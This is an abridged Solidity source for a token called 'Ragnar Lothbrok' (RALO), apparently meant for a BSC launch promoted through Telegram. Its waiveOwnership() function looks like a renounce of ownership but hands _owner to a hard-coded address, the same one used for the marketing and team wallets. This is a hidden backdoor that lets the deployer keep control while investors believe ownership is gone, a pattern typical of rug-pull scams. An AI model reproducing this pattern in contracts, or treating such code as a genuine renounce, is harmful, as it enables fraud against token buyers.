...
/**
Telegram : https://t.me/RagnarLothbrokBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xDe945791A64825a8FDBa73CedBbED62040D074a5);
    }
...
contract RagnarLothbrok is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ragnar Lothbrok";
    string private _symbol = "RALO";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xDe945791A64825a8FDBa73CedBbED62040D074a5);
    address payable private teamWalletAddress = payable(0xDe945791A64825a8FDBa73CedBbED62040D074a5);
